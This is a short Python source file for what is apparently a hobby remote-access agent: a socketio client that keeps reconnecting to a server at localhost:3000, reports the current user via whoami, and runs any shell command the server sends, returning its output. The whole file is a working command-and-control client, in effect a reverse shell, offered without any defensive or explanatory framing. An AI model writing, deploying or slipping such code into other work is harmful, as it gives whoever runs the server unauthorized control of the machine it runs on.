from asyncio import subprocess
from asyncio.subprocess import STDOUT
from socket import socket
from time import sleep
import socketio
import subprocess
from subprocess import Popen, PIPE, STDOUT
import cmd
import os

sio = socketio.Client()

## Services

def executeCommand(command):
    if (command.split(" ")[0] == "cd"):
        try:
            os.chdir(command.split(" ")[1])
            sio.emit("command_output", "")
        except:
            sio.emit("command_output", "Directory '" + command.split(" ")[1] + "' not found")
    else:
        p = subprocess.run(command, shell=True, stdout=PIPE, stderr=PIPE)
        sio.emit("command_output", p.stdout.decode() + p.stderr.decode())

## Events

@sio.event
def connect():
    sio.emit("name", {"name" : os.popen("whoami").read()})
    print("I'm connected boi")

@sio.event
def connect_error(data):
    print("The connection failed!")

@sio.event
def message(data):
    print('I received a message!')
    if (data["type"] == "msg"):
        print(data["msg"])
    elif (data["type"] == "command"):
        executeCommand(data["command"])

@sio.event
def disconnect():
    print("Server isn't running anymore :(")



while (not(sio.connected)):
    try:
        sio.connect('http://localhost:3000/')
    except:
        print("Server not running")
    sleep(3)
